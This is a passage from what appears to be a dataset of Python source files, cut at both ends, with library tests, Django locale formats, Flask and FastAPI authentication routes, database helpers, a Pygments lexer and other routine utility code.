    text = ""Det är bl.a. inte meningen""
    tokens = sv_tokenizer(text)
    assert len(tokens) == 5
    assert tokens[2].text == ""bl.a.""


def test_sv_tokenizer_handles_custom_base_exc(sv_tokenizer):
    text = ""Här är något du kan titta på.""
    tokens = sv_tokenizer(text)
    assert len(tokens) == 8
    assert tokens[6].text == ""på""
    assert tokens[7].text == ""."""
JY518	JY518-auth.py	"from fastapi import APIRouter, Depends, HTTPException
from fastapi.security import OAuth2PasswordRequestForm
from starlette import status

from app.repository.users_repository import UsersRepository
from app.repository.unit_of_work import UnitOfWork
from app.users_service.users_service import UsersService
from app.users_service.users import User
from app.web.api.schemas import UserRegisterInSchema, UserOutSchema, Token
from app.web.api.auth import authenticate_user, issue_new_token, get_current_user

router = APIRouter(tags=[""auth""])


@router.post(
    ""/register"", status_code=status.HTTP_201_CREATED, response_model=UserOutSchema
)
async def register(payload: UserRegisterInSchema):
    with UnitOfWork() as unit_of_work:
        repo = UsersRepository(unit_of_work.session)
        users_service = UsersService(repo)
        # user ID didn't exist before commit
        # we have to get it now when the SQLAlchemy session is still active.
        user_data = payload.dict()
        del user_data[""password_confirm""]
        user = users_service.add_user(**user_data)
        unit_of_work.commit()
        res = user.dict()
    return res


@router.post(""/token"", response_model=Token)
async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends()):
    user = authenticate_user(form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=""Incorrect username or password"",
            headers={""WWW-Authenticate"": ""Bearer""},
        )
    token = issue_new_token(user)
    return token


@router.get(""/current_user"", response_model=UserOutSchema)
async def get_current_user(current_user: User = Depends(get_current_user)):
    return current_user.dict()"
JY283	JY283-genericworker.py	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2023 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior




class GenericWorker(QtCore.QObject):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()

        self.fullposeestimation_proxy = mprx[""FullPoseEstimationProxy""]

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
JD112	JD112-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'd F Y'  # 25 Ottobre 2006
TIME_FORMAT = 'H:i'  # 14:30
DATETIME_FORMAT = 'l d F Y H:i'  # Mercoledì 25 Ottobre 2006 14:30
YEAR_MONTH_FORMAT = 'F Y'  # Ottobre 2006
MONTH_DAY_FORMAT = 'j F'  # 25 Ottobre
SHORT_DATE_FORMAT = 'd/m/Y'  # 25/12/2009
SHORT_DATETIME_FORMAT = 'd/m/Y H:i'  # 25/10/2009 14:30
FIRST_DAY_OF_WEEK = 1  # Lunedì

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%Y/%m/%d',  # '25/10/2006', '2008/10/25'
    '%d-%m-%Y', '%Y-%m-%d',  # '25-10-2006', '2008-10-25'
    '%d-%m-%y', '%d/%m/%y',  # '25-10-06', '25/10/06'
]
DATETIME_INPUT_FORMATS = [
    '%d/%m/%Y %H:%M:%S',     # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',  # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',        # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',     # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',  # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',        # '25/10/06 14:30'
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d-%m-%Y %H:%M:%S',     # '25-10-2006 14:30:59'
    '%d-%m-%Y %H:%M:%S.%f',  # '25-10-2006 14:30:59.000200'
    '%d-%m-%Y %H:%M',        # '25-10-2006 14:30'
    '%d-%m-%y %H:%M:%S',     # '25-10-06 14:30:59'
    '%d-%m-%y %H:%M:%S.%f',  # '25-10-06 14:30:59.000200'
    '%d-%m-%y %H:%M',        # '25-10-06 14:30'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JD286	JD286-邻接表DFS与BFS.py	"from node import AdjacencyNode
from structure import AdjacencyList
from util import util


def dfs(adjacency_list:AdjacencyList, start:int) -> list:
    
    def func(node:AdjacencyNode):
        nonlocal marks
        temp = node.next_node
        while temp:
            if temp.value not in marks:
                marks.append(temp.value)
                func(temp.value)
            temp = temp.next_node

    marks = [adjacency_list[start]]
    func(adjacency_list[start])
    return [node.value for node in marks]


def bfs(adjacency_list:AdjacencyList, start:int) -> list:
    temp1 = [adjacency_list[start]]
    marks = [adjacency_list[start]]
    while temp1:
        lay = list()
        for node in temp1:
            temp2 = node.next_node
            while temp2: 
                if temp2.value not in marks:
                    lay.append( temp2.value )
                    marks.append( temp2.value )
                temp2 = temp2.next_node
        temp1 = lay
    return [ node.value for node in marks]
    
if __name__ == ""__main__"":
    m = [[0,1,0,1,1,0,0,0],
         [1,0,1,0,1,0,0,0],
         [0,1,0,0,0,1,0,0],
         [1,0,0,0,0,0,2,0],
         [1,1,0,0,0,0,1,0],
         [0,0,1,0,0,0,0,0],
         [0,0,0,1,1,0,0,1],
         [0,0,0,0,0,0,1,0]]

    d = {0:AdjacencyNode('A'), 
         1:AdjacencyNode('B'),
         2:AdjacencyNode('C'),
         3:AdjacencyNode('D'),
         4:AdjacencyNode('E'),
         5:AdjacencyNode('F'),
         6:AdjacencyNode('G'),
         7:AdjacencyNode('H')}


    adjacency_list = AdjacencyList(list(d.values()))
    adjacency_list.build_from_adjacency_mat(m)
    adjacency_list.show()
    # util.show_mat(t.adjacencu_mat)
    print(""DFS:"", adjacency_list.dfs(0), sep=' ')
    # ['A', 'B', 'C', 'F', 'E', 'G', 'D', 'H']
    print(""BFS:"", adjacency_list.bfs(0), sep=' ')
    # ['A', 'B', 'D', 'E', 'C', 'G', 'F', 'H']"
JD519	JD519-test_internals.py	"import numpy as np
import pytest

import pandas.util._test_decorators as td

from pandas import DataFrame
from pandas.tests.copy_view.util import get_array


@td.skip_array_manager_invalid_test
def test_consolidate(using_copy_on_write):

    # create unconsolidated DataFrame
    df = DataFrame({""a"": [1, 2, 3], ""b"": [0.1, 0.2, 0.3]})
    df[""c""] = [4, 5, 6]

    # take a viewing subset
    subset = df[:]

    # each block of subset references a block of df
    assert subset._mgr.refs is not None and all(
        ref is not None for ref in subset._mgr.refs
    )

    # consolidate the two int64 blocks
    subset._consolidate_inplace()

    # the float64 block still references the parent one because it still a view
    assert subset._mgr.refs[0] is not None
    # equivalent of assert np.shares_memory(df[""b""].values, subset[""b""].values)
    # but avoids caching df[""b""]
    assert np.shares_memory(get_array(df, ""b""), get_array(subset, ""b""))

    # the new consolidated int64 block does not reference another
    assert subset._mgr.refs[1] is None

    # the parent dataframe now also only is linked for the float column
    assert df._mgr._has_no_reference(0)
    assert not df._mgr._has_no_reference(1)
    assert df._mgr._has_no_reference(2)

    # and modifying subset still doesn't modify parent
    if using_copy_on_write:
        subset.iloc[0, 1] = 0.0
        assert df._mgr._has_no_reference(1)
        assert df.loc[0, ""b""] == 0.1


@td.skip_array_manager_invalid_test
def test_clear_parent(using_copy_on_write):
    # ensure to clear parent reference if we are no longer viewing data from parent
    if not using_copy_on_write:
        pytest.skip(""test only relevant when using copy-on-write"")

    df = DataFrame({""a"": [1, 2, 3], ""b"": [0.1, 0.2, 0.3]})
    subset = df[:]
    assert subset._mgr.parent is not None

    # replacing existing columns loses the references to the parent df
    subset[""a""] = 0
    assert subset._mgr.parent is not None
    # when losing the last reference, also the parent should be reset
    subset[""b""] = 0
    assert subset._mgr.parent is None"
JD388	JD388-sql.py	"import sys

from django.apps import apps
from django.db import models


def sql_flush(style, connection, reset_sequences=True, allow_cascade=False):
    """"""
    Return a list of the SQL statements used to flush the database.
    """"""
    tables = connection.introspection.django_table_names(
        only_existing=True, include_views=False
    )
    return connection.ops.sql_flush(
        style,
        tables,
        reset_sequences=reset_sequences,
        allow_cascade=allow_cascade,
    )


def emit_pre_migrate_signal(verbosity, interactive, db, **kwargs):
    # Emit the pre_migrate signal for every application.
    for app_config in apps.get_app_configs():
        if app_config.models_module is None:
            continue
        if verbosity >= 2:
            stdout = kwargs.get(""stdout"", sys.stdout)
            stdout.write(
                ""Running pre-migrate handlers for application %s"" % app_config.label
            )
        models.signals.pre_migrate.send(
            sender=app_config,
            app_config=app_config,
            verbosity=verbosity,
            interactive=interactive,
            using=db,
            **kwargs,
        )


def emit_post_migrate_signal(verbosity, interactive, db, **kwargs):
    # Emit the post_migrate signal for every application.
    for app_config in apps.get_app_configs():
        if app_config.models_module is None:
            continue
        if verbosity >= 2:
            stdout = kwargs.get(""stdout"", sys.stdout)
            stdout.write(
                ""Running post-migrate handlers for application %s"" % app_config.label
            )
        models.signals.post_migrate.send(
            sender=app_config,
            app_config=app_config,
            verbosity=verbosity,
            interactive=interactive,
            using=db,
            **kwargs,
        )"
JD424	JD424-manager.py	"from sqlalchemy import create_engine
import pandas as pd

class Manager:
    __instance = None

    def __init__(self, engine=None, username=None, password=None, database=None, host=None, port=None):
        if Manager.__instance is None:
            self.engine_type = engine
            self.username = username
            self.password = password
            self.database = database
            self.host = host
            self.port = port
            self.url = self._generate_url()
            self.engine = create_engine(self.url)
            Manager.__instance = self
        else:
            raise Exception(""Cannot create multiple instances of Database class"")

    @staticmethod
    def get_instance(engine=None, username=None, password=None, database=None, host=None, port=None):
        if Manager.__instance is None:
            Manager(engine, username, password, database, host, port)
        return Manager.__instance

    def _generate_url(self):
        if self.engine_type == 'postgresql':
            return f""postgresql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'mysql':
            return f""mysql+pymysql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'sqlite':
            return f""sqlite:///{self.database}""
        elif self.engine_type == 'oracle':
            return f""oracle://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'mssql':
            return f""mssql+pymssql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        else:
            raise Exception(""Unsupported engine type"")

    def execute_query(self, query):
        with self.engine.connect() as conn:
            result = conn.execute(query)
            data = pd.DataFrame(result.fetchall(), columns=result.keys())
        return data"
JD403	JD403-forms.py	"from django import forms

from ckeditor.fields import RichTextFormField
from ckeditor.widgets import CKEditorWidget
from ckeditor_uploader.fields import RichTextUploadingFormField
from ckeditor_uploader.widgets import CKEditorUploadingWidget

from .models import ExampleModel, ExampleNonUploadModel
from .widgets import CkEditorMultiWidget


class CkEditorForm(forms.Form):
    ckeditor_standard_example = RichTextFormField()
    ckeditor_upload_example = RichTextUploadingFormField(
        config_name=""my-custom-toolbar""
    )


class CkEditorMultiWidgetForm(forms.Form):
    SUBWIDGET_SUFFIXES = [""0"", ""1""]

    ckeditor_standard_multi_widget_example = forms.CharField(
        widget=CkEditorMultiWidget(
            widgets={suffix: CKEditorWidget for suffix in SUBWIDGET_SUFFIXES},
        ),
    )
    ckeditor_upload_multi_widget_example = forms.CharField(
        widget=CkEditorMultiWidget(
            widgets={
                suffix: CKEditorUploadingWidget(config_name=""my-custom-toolbar"")
                for suffix in SUBWIDGET_SUFFIXES
            },
        ),
    )


class ExampleModelForm(forms.ModelForm):
    class Meta:
        model = ExampleModel
        fields = ""__all__""


class ExampleNonUploadModelForm(forms.ModelForm):
    class Meta:
        model = ExampleNonUploadModel
        fields = ""__all__""


class ExampleModelOverriddenWidgetForm(forms.ModelForm):
    class Meta:
        model = ExampleModel
        fields = ""__all__""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.fields[""content""].widget = CKEditorUploadingWidget(
            config_name=""my-custom-toolbar"",
            extra_plugins=[""someplugin"", ""anotherplugin""],
            external_plugin_resources=[
                (
                    ""someplugin"",
                    ""/static/path/to/someplugin/"",
                    ""plugin.js"",
                )
            ],
        )"
JD202	JD202-roboconf.py	"""""""
    pygments.lexers.roboconf
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Roboconf DSL.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, words, re
from pygments.token import Text, Operator, Keyword, Name, Comment

__all__ = ['RoboconfGraphLexer', 'RoboconfInstancesLexer']


class RoboconfGraphLexer(RegexLexer):
    """"""
    Lexer for Roboconf graph files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Graph'
    aliases = ['roboconf-graph']
    filenames = ['*.graph']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [
            # Skip white spaces
            (r'\s+', Text),

            # There is one operator
            (r'=', Operator),

            # Keywords
            (words(('facet', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words((
                'installer', 'extends', 'exports', 'imports', 'facets',
                'children'), suffix=r'\s*:?', prefix=r'\b'), Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }


class RoboconfInstancesLexer(RegexLexer):
    """"""
    Lexer for Roboconf instances files.

    .. versionadded:: 2.1
    """"""
    name = 'Roboconf Instances'
    aliases = ['roboconf-instances']
    filenames = ['*.instances']

    flags = re.IGNORECASE | re.MULTILINE
    tokens = {
        'root': [

            # Skip white spaces
            (r'\s+', Text),

            # Keywords
            (words(('instance of', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),
            (words(('name', 'count'), suffix=r's*:?', prefix=r'\b'), Name),
            (r'\s*[\w.-]+\s*:', Name),

            # Comments
            (r'#.*\n', Comment),

            # Default
            (r'[^#]', Text),
            (r'.*\n', Text)
        ]
    }"
JD466	JD466-main_postgres_pooling.py	"# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START gae_python38_cloudsql_psql_pooling]
# [START gae_python3_cloudsql_psql_pooling]
import os

from flask import Flask
import psycopg2.pool

db_user = os.environ.get('CLOUD_SQL_USERNAME')
db_password = os.environ.get('CLOUD_SQL_PASSWORD')
db_name = os.environ.get('CLOUD_SQL_DATABASE_NAME')
db_connection_name = os.environ.get('CLOUD_SQL_CONNECTION_NAME')

# When deployed to App Engine, the `GAE_ENV` environment variable will be
# set to `standard`
if os.environ.get('GAE_ENV') == 'standard':
    # If deployed, use the local socket interface for accessing Cloud SQL
    host = '/cloudsql/{}'.format(db_connection_name)
else:
    # If running locally, use the TCP connections instead
    # Set up Cloud SQL Proxy (cloud.google.com/sql/docs/mysql/sql-proxy)
    # so that your application can use 127.0.0.1:3306 to connect to your
    # Cloud SQL instance
    host = '127.0.0.1'

db_config = {
    'user': db_user,
    'password': db_password,
    'database': db_name,
    'host': host
}

cnxpool = psycopg2.pool.ThreadedConnectionPool(minconn=1, maxconn=3,
                                               **db_config)

app = Flask(__name__)


@app.route('/')
def main():
    cnx = cnxpool.getconn()
    with cnx.cursor() as cursor:
        cursor.execute('SELECT NOW() as now;')
        result = cursor.fetchall()
    current_time = result[0][0]
    cnx.commit()
    cnxpool.putconn(cnx)

    return str(current_time)
# [END gae_python3_cloudsql_psql_pooling]
# [END gae_python38_cloudsql_psql_pooling]


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=True)"
JD88	JD88-fixmodnames.py	"""""""Fix the name of modules

This module is useful when you want to rename many of the modules in
your project.  That can happen specially when you want to change their
naming style.

For instance::

  fixer = FixModuleNames(project)
  changes = fixer.get_changes(fixer=str.lower)
  project.do(changes)

Here it renames all modules and packages to use lower-cased chars.
You can tell it to use any other style by using the ``fixer``
argument.

""""""
from rope.base import taskhandle
from rope.contrib import changestack
from rope.refactor import rename


class FixModuleNames:
    def __init__(self, project):
        self.project = project

    def get_changes(self, fixer=str.lower, task_handle=taskhandle.DEFAULT_TASK_HANDLE):
        """"""Fix module names

        `fixer` is a function that takes and returns a `str`.  Given
        the name of a module, it should return the fixed name.

        """"""
        stack = changestack.ChangeStack(self.project, ""Fixing module names"")
        jobset = task_handle.create_jobset(
            ""Fixing module names"", self._count_fixes(fixer) + 1
        )
        try:
            while True:
                for resource in self._tobe_fixed(fixer):
                    jobset.started_job(resource.path)
                    renamer = rename.Rename(self.project, resource)
                    changes = renamer.get_changes(fixer(self._name(resource)))
                    stack.push(changes)
                    jobset.finished_job()
                    break
                else:
                    break
        finally:
            jobset.started_job(""Reverting to original state"")
            stack.pop_all()
            jobset.finished_job()
        return stack.merged()

    def _count_fixes(self, fixer):
        return len(list(self._tobe_fixed(fixer)))

    def _tobe_fixed(self, fixer):
        for resource in self.project.get_python_files():
            modname = self._name(resource)
            if modname != fixer(modname):
                yield resource

    def _name(self, resource):
        modname = resource.name.rsplit(""."", 1)[0]
        if modname == ""__init__"":
            modname = resource.parent.name
        return modname"
JY274	JY274-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterpolargl.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY563	JY563-fallback.py	"from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import CookieStorage
from django.contrib.messages.storage.session import SessionStorage


class FallbackStorage(BaseStorage):
    """"""
    Try to store all messages in the first backend. Store any unstored
    messages in each subsequent backend.
    """"""
    storage_classes = (CookieStorage, SessionStorage)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.storages = [storage_class(*args, **kwargs)
                         for storage_class in self.storage_classes]
        self._used_storages = set()

    def _get(self, *args, **kwargs):
        """"""
        Get a single list of messages from all storage backends.
        """"""
        all_messages = []
        for storage in self.storages:
            messages, all_retrieved = storage._get()
            # If the backend hasn't been used, no more retrieval is necessary.
            if messages is None:
                break
            if messages:
                self._used_storages.add(storage)
            all_messages.extend(messages)
            # If this storage class contained all the messages, no further
            # retrieval is necessary
            if all_retrieved:
                break
        return all_messages, all_retrieved

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store the messages and return any unstored messages after trying all
        backends.

        For each storage backend, any messages not stored are passed on to the
        next backend.
        """"""
        for storage in self.storages:
            if messages:
                messages = storage._store(messages, response, remove_oldest=False)
            # Even if there are no more messages, continue iterating to ensure
            # storages which contained messages are flushed.
            elif storage in self._used_storages:
                storage._store([], response)
                self._used_storages.remove(storage)
        return messages"
JD59	JD59-progress_bars.py	"import functools
from typing import Callable, Generator, Iterable, Iterator, Optional, Tuple

from pip._vendor.rich.progress import (
    BarColumn,
    DownloadColumn,
    FileSizeColumn,
    Progress,
    ProgressColumn,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

from pip._internal.utils.logging import get_indentation

DownloadProgressRenderer = Callable[[Iterable[bytes]], Iterator[bytes]]


def _rich_progress_bar(
    iterable: Iterable[bytes],
    *,
    bar_type: str,
    size: int,
) -> Generator[bytes, None, None]:
    assert bar_type == ""on"", ""This should only be used in the default mode.""

    if not size:
        total = float(""inf"")
        columns: Tuple[ProgressColumn, ...] = (
            TextColumn(""[progress.description]{task.description}""),
            SpinnerColumn(""line"", speed=1.5),
            FileSizeColumn(),
            TransferSpeedColumn(),
            TimeElapsedColumn(),
        )
    else:
        total = size
        columns = (
            TextColumn(""[progress.description]{task.description}""),
            BarColumn(),
            DownloadColumn(),
            TransferSpeedColumn(),
            TextColumn(""eta""),
            TimeRemainingColumn(),
        )

    progress = Progress(*columns, refresh_per_second=30)
    task_id = progress.add_task("" "" * (get_indentation() + 2), total=total)
    with progress:
        for chunk in iterable:
            yield chunk
            progress.update(task_id, advance=len(chunk))


def get_download_progress_renderer(
    *, bar_type: str, size: Optional[int] = None
) -> DownloadProgressRenderer:
    """"""Get an object that can be used to render the download progress.

    Returns a callable, that takes an iterable to ""wrap"".
    """"""
    if bar_type == ""on"":
        return functools.partial(_rich_progress_bar, bar_type=bar_type, size=size)
    else:
        return iter  # no-op, when passed an iterator"
JD183	JD183-app.py	"#!/usr/bin/env python3
""""""Route module for the API.
""""""
import os
from os import getenv
from flask import Flask, jsonify, abort, request
from flask_cors import (CORS, cross_origin)

from api.v1.views import app_views
from api.v1.auth.auth import Auth
from api.v1.auth.basic_auth import BasicAuth
from api.v1.auth.session_auth import SessionAuth
from api.v1.auth.session_db_auth import SessionDBAuth
from api.v1.auth.session_exp_auth import SessionExpAuth


app = Flask(__name__)
app.register_blueprint(app_views)
CORS(app, resources={r""/api/v1/*"": {""origins"": ""*""}})
auth = None
auth_type = getenv('AUTH_TYPE', 'auth')
if auth_type == 'auth':
    auth = Auth()
if auth_type == 'basic_auth':
    auth = BasicAuth()
if auth_type == 'session_auth':
    auth = SessionAuth()
if auth_type == 'session_exp_auth':
    auth = SessionExpAuth()
if auth_type == 'session_db_auth':
    auth = SessionDBAuth()


@app.errorhandler(404)
def not_found(error) -> str:
    """"""Not found handler.
    """"""
    return jsonify({""error"": ""Not found""}), 404


@app.errorhandler(401)
def unauthorized(error) -> str:
    """"""Unauthorized handler.
    """"""
    return jsonify({""error"": ""Unauthorized""}), 401


@app.errorhandler(403)
def forbidden(error) -> str:
    """"""Forbidden handler.
    """"""
    return jsonify({""error"": ""Forbidden""}), 403


@app.before_request
def authenticate_user():
    """"""Authenticates a user before processing a request.
    """"""
    if auth:
        excluded_paths = [
            ""/api/v1/status/"",
            ""/api/v1/unauthorized/"",
            ""/api/v1/forbidden/"",
            ""/api/v1/auth_session/login/"",
        ]
        if auth.require_auth(request.path, excluded_paths):
            user = auth.current_user(request)
            if auth.authorization_header(request) is None and \
                    auth.session_cookie(request) is None:
                abort(401)
            if user is None:
                abort(403)
            request.current_user = user


if __name__ == ""__main__"":
    host = getenv(""API_HOST"", ""0.0.0.0"")
    port = getenv(""API_PORT"", ""5000"")
    app.run(host=host, port=port)"
JY465	JY465-test_construct_from_scalar.py	"import numpy as np
import pytest

from pandas.core.dtypes.cast import construct_1d_arraylike_from_scalar
from pandas.core.dtypes.dtypes import CategoricalDtype

from pandas import (
    Categorical,
    Timedelta,
)
import pandas._testing as tm


def test_cast_1d_array_like_from_scalar_categorical():
    # see gh-19565
    #
    # Categorical result from scalar did not maintain
    # categories and ordering of the passed dtype.
    cats = [""a"", ""b"", ""c""]
    cat_type = CategoricalDtype(categories=cats, ordered=False)
    expected = Categorical([""a"", ""a""], categories=cats)

    result = construct_1d_arraylike_from_scalar(""a"", len(expected), cat_type)
    tm.assert_categorical_equal(result, expected)


def test_cast_1d_array_like_from_timestamp(fixed_now_ts):
    # check we dont lose nanoseconds
    ts = fixed_now_ts + Timedelta(1)
    res = construct_1d_arraylike_from_scalar(ts, 2, np.dtype(""M8[ns]""))
    assert res[0] == ts


def test_cast_1d_array_like_from_timedelta():
    # check we dont lose nanoseconds
    td = Timedelta(1)
    res = construct_1d_arraylike_from_scalar(td, 2, np.dtype(""m8[ns]""))
    assert res[0] == td


def test_cast_1d_array_like_mismatched_datetimelike():
    td = np.timedelta64(""NaT"", ""ns"")
    dt = np.datetime64(""NaT"", ""ns"")

    with pytest.raises(TypeError, match=""Cannot cast""):
        construct_1d_arraylike_from_scalar(td, 2, dt.dtype)

    with pytest.raises(TypeError, match=""Cannot cast""):
        construct_1d_arraylike_from_scalar(np.timedelta64(4, ""ns""), 2, dt.dtype)

    with pytest.raises(TypeError, match=""Cannot cast""):
        construct_1d_arraylike_from_scalar(dt, 2, td.dtype)

    with pytest.raises(TypeError, match=""Cannot cast""):
        construct_1d_arraylike_from_scalar(np.datetime64(4, ""ns""), 2, td.dtype)"
JY4	JY4-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""CP949""

    @property
    def language(self) -> str:
        return ""Korean"""
JY135	JY135-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j N Y'
DATETIME_FORMAT = ""j N Y, G.i""
TIME_FORMAT = 'G.i'
YEAR_MONTH_FORMAT = 'F Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'd-m-Y'
SHORT_DATETIME_FORMAT = 'd-m-Y G.i'
FIRST_DAY_OF_WEEK = 1  # Monday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d-%m-%Y', '%d/%m/%Y',             # '25-10-2009', 25/10/2009'
    '%d-%m-%y', '%d/%m/%y',             # '25-10-09', 25/10/09'
    '%d %b %Y',                         # '25 Oct 2006',
    '%d %B %Y',                         # '25 October 2006'
    '%m/%d/%y', '%m/%d/%Y',             # '10/25/06', '10/25/2009'
]

TIME_INPUT_FORMATS = [
    '%H.%M.%S',                         # '14.30.59'
    '%H.%M',                            # '14.30'
]

DATETIME_INPUT_FORMATS = [
    '%d-%m-%Y %H.%M.%S',                # '25-10-2009 14.30.59'
    '%d-%m-%Y %H.%M.%S.%f',             # '25-10-2009 14.30.59.000200'
    '%d-%m-%Y %H.%M',                   # '25-10-2009 14.30'
    '%d-%m-%y %H.%M.%S',                # '25-10-09' 14.30.59'
    '%d-%m-%y %H.%M.%S.%f',             # '25-10-09' 14.30.59.000200'
    '%d-%m-%y %H.%M',                   # '25-10-09' 14.30'
    '%m/%d/%y %H.%M.%S',                # '10/25/06 14.30.59'
    '%m/%d/%y %H.%M.%S.%f',             # '10/25/06 14.30.59.000200'
